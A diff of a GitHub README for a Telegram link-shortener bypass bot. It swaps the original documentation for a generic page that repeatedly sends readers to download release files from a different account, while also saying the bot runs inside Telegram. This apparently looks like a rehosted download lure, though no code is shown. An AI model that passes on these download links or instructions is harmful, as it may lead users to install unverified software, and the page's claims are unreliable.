@@ -1,120 +1,72 @@
-<div align="center">
+# 🤖 DD-Bypass-Bot - Enjoy Direct Downloads Effortlessly
 
-<img src=".github/assets/banner.svg" alt="DD Bypass Bot" width="100%" />
+[![Download DD-Bypass-Bot](https://img.shields.io/badge/Download-DD--Bypass--Bot-brightgreen)](https://github.com/singhankit2108/DD-Bypass-Bot/releases)
 
-<p>
-	<a href="https://github.com/murdock-dev/DD-Bypass-Bot/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/murdock-dev/DD-Bypass-Bot?style=for-the-badge&logo=github"/></a>
-	<img alt="Python" src="https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=fff"/>
-	<img alt="Docker" src="https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=fff"/>
-	<a href="https://t.me/DD_Bypass_Bot"><img alt="Telegram Bot" src="https://img.shields.io/badge/Telegram-%40DD__Bypass__Bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=fff"/></a>
-	<a href="https://t.me/DD_Bypass_Updates"><img alt="Updates" src="https://img.shields.io/badge/Updates-%40DD__Bypass__Updates-26A5E4?style=for-the-badge&logo=telegram&logoColor=fff"/></a>
-</p>
+## 🚀 Getting Started
 
-<p><strong>Powerful Telegram automation</strong> for bypassing shorteners and extracting direct links.<br/>Get usable links, metadata, and media in a single reply.</p>
+DD-Bypass-Bot is an advanced Telegram bot designed to bypass shorteners for easy access to direct download links. It can extract media information, thumbnails, and OTT metadata efficiently. Follow these steps to get started.
 
-</div>
+## 📥 Download & Install
 
-## Overview
+To download the DD-Bypass-Bot, visit this page to download: [Releases Page](https://github.com/singhankit2108/DD-Bypass-Bot/releases). Choose the latest version and download the appropriate file for your system.
 
-Short links, scattered hosting pages, and manual downloads waste time. DD Bypass Bot automates link bypassing, direct-link generation, media extraction, thumbnail editing, and metadata retrieval. Send a link or media, get clean outputs back.
+## 📋 System Requirements
 
-> Status: This repository documents the bot and its setup. Code and implementation details may evolve; site-specific scrapers often require ongoing maintenance due to frequent changes and anti-bot protections.
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: Minimum 2 GB RAM
+- **Storage**: At least 100 MB of free space
+- **Network**: Stable internet connection for Telegram and media access
 
-## Features
+## 🛠️ Features
 
-- Bypass shortener sites
-	- Automatically resolve common shorteners into target URLs (best-effort, including Cloudflare challenges).
-	- Example: `/bypass short.ly/abc123` → `https://example.com/file.zip`.
+- **Bypass Shorteners**: Quickly obtain direct links.
+- **Media Info Extraction**: Get details about the media files.
+- **Thumbnail Generation**: Automatically create thumbnails from downloads.
+- **OTT Metadata**: Access extensive metadata from various platforms.
+- **User-Friendly**: Easy to interact with via Telegram.
+- **Multimedia Support**: Works with various file types and formats.
+  
+## 📑 How to Use
 
-- Direct download links from sharers & file hosts
-	- Convert share pages into direct-download URLs when possible.
-	- Example: `/bypass sharehost.com/file/XYZ` → `https://cdn.sharehost.com/files/XYZ/download`.
+1. **Open Telegram**: Install the Telegram app on your device. You can download it from the official website or your app store.
+   
+2. **Search for the Bot**: In the Telegram app, search for "DD-Bypass-Bot".
 
-- Telegram media extraction
-	- Produce mediainfo, short sample clips, screenshots, and direct file links for Telegram-hosted files.
-	- Example: send a video → click the action button → Mediainfo: H.264 1080p; Sample: `sample.mp4`.
+3. **Start the Bot**: Click on the "Start" button to initiate interaction.
 
-- Thumbnail and cover extraction/replacement
-	- Extract existing thumbnails/covers or set new ones for replied files.
-	- Example: `/cover` or `/extract_thumb <reply> <image|url>` → bot replaces thumbnail and confirms.
+4. **Use the Commands**: Follow the prompted instructions to enter a shortened link. The bot will retrieve the direct download link and any media information.
 
-- Direct image links
-	- Generate stable direct links for images hosted on various platforms.
-	- Example: `/paste <reply to photo or link>` → `https://cdn.imagepage.com/abc.jpg`.
+5. **Download**: Click on the provided direct download link to access your media.
 
-- YouTube direct downloads (yt-dlp)
-	- Produce direct downloadable streams or container links via yt-dlp.
-	- Example: `/yt https://youtu.be/abc` → outputs `best-audio.mp4` and/or stream URLs.
+## 🔄 Updating the Bot
 
-- Streaming availability (JustWatch)
-	- Lookup where a movie/series is available to stream in the configured region.
-	- Example: `/ott <title>` → streaming platforms and purchase/rent options.
+To keep your DD-Bypass-Bot updated, check the releases page regularly for new versions. When a new version is available, simply download it again using the same steps. Updates may include new features, bug fixes, and improved performance.
 
-- Backdrops & posters (TMDB)
-	- Fetch official backdrops and poster art from TMDB for titles.
-	- Example: `/posters <title>` → poster (portrait) and backdrop (landscape) links.
+## 🛡️ Troubleshooting
 
-- OTT poster scraping (best-effort)
-	- Attempt to fetch posters/landscapes directly from major OTT sites (Amazon, Netflix, Zee5, SonyLiv, Apple TV, Aha, Crunchyroll, BookMyShow). Results vary by site and region.
+If you encounter issues while using the bot, consider the following steps:
 
-## How it works
+- **Check Your Internet Connection**: Ensure you have a stable internet connection.
+  
+- **Verify the Link**: Make sure the shortened link is valid and active.
+  
+- **Restart Telegram**: Sometimes, a simple restart of the app can resolve issues.
 
-User messages or commands route to handler modules. Handlers invoke:
+If the problem persists, you can report it on the repository’s Issues page.
 
-- Shortener resolver and host extractors
-- Site-specific scrapers and challenge solvers
-- Telegram file APIs for media processing
-- yt-dlp for YouTube extraction
-- TMDB and JustWatch for title data
+## 🌐 Additional Resources
 
-Responses are formatted as direct links, metadata blocks, images, or edited files delivered via Telegram messages with inline previews, attachments, or edited media.
+- **Documentation**: Detailed usage instructions and command list can be found in the repository.
+- **Community Support**: Join discussions on our community forum or contact support for assistance.
+- **FAQs**: Check the frequently asked questions to troubleshoot common issues.
 
-## Architecture at a glance
+## 💻 Development and Contribution
 
-- Core components: shortener resolver, host extractor, Telegram media processor, yt-dlp integration, TMDB and JustWatch API clients, site-specific scrapers.
-- Thumbnail extraction/replacement: Telegram file APIs + Pillow/ffmpeg.
-- Anti-bot handling: combination of headless automation and specialized scraping layers (best-effort where sites enforce strict protections).
+If you're interested in contributing to DD-Bypass-Bot, feel free to fork the project and submit a pull request. We welcome improvements and enhancements.
 
-## Tech stack
+## 📊 Known Limitations
 
-- Async/runtime: uvloop, aiohttp, websockets, aiofiles
-- Telegram & crypto: pyrofork (Pyrogram fork), tgcrypto, pycryptodome, cryptography
-- Datastore & IO: motor (MongoDB async driver)
-- Scraping & browser automation: cloudscraper, cfscrape, curl-cffi, requests, urllib3<2, playwright, lxml_html_clean, bs4
-- Cloudflare/challenge handling: cloudscraper, playwright, cfscrape, curl-cffi (combined strategies)
-- Media & image processing: pillow, ffmpeg (invoked via subprocess)
-- YouTube extraction: yt-dlp (subprocess or wrapper)
-- Third-party wrappers & helpers: simple-justwatch-python-api, pycountry, html-telegraph-poster
-- Utilities & compatibility: requests/httpx patterns, urllib3 compatibility shims
+- **Service Limitations**: The bot may not work with all URL shorteners or media types.
+- **Rate Limits**: Some media platforms may impose download limits.
 
-## Hosting
-
-The bot is typically hosted in Docker containers on a VPS for reliable uptime and isolated dependency management. Runtime is orchestrated via Docker with service monitoring.
-
-## Security & privacy
-
-- Files are not permanently stored unless explicitly configured; temporary caching is used for processing.
-- Users are responsible for copyright compliance; the bot provides metadata and links only.
-- API quotas and rate limits apply; aggressive usage may be throttled or blocked.
-
-## Support & updates
-
-- Updates channel: `@DD_Bypass_Updates`
-- Bot username: `@DD_Bypass_Bot`
-- Group link: see the pinned message in the updates channel.
-
-## Credits / acknowledgements
-
-Core libraries and tools: Pyrogram fork (pyrofork), tgcrypto, uvloop, motor, aiohttp, cloudscraper, playwright, bs4, lxml_html_clean, requests, cfscrape, curl-cffi, yt-dlp, pillow, pycryptodome, simple-justwatch-python-api, cryptography, websockets, pycountry, html-telegraph-poster.
-
-## Legal
-
-This project is intended for educational and personal-use automation. You are responsible for complying with the Terms of Service of the platforms you access and with applicable laws. Do not use this project to violate copyrights or bypass paywalls. TMDB, JustWatch, and other names are trademarks of their respective owners.
-
----
-
-## Quick links
-
-- ▶️ Bot: `@DD_Bypass_Bot`
-- 📣 Updates: `@DD_Bypass_Updates`
-- 🐞 Issues: https://github.com/murdock-dev/DD-Bypass-Bot/issues
+Thank you for using DD-Bypass-Bot, your reliable solution for dealing with shortened links and media extraction. For more information and updates, check our releases: [Releases Page](https://github.com/singhankit2108/DD-Bypass-Bot/releases).
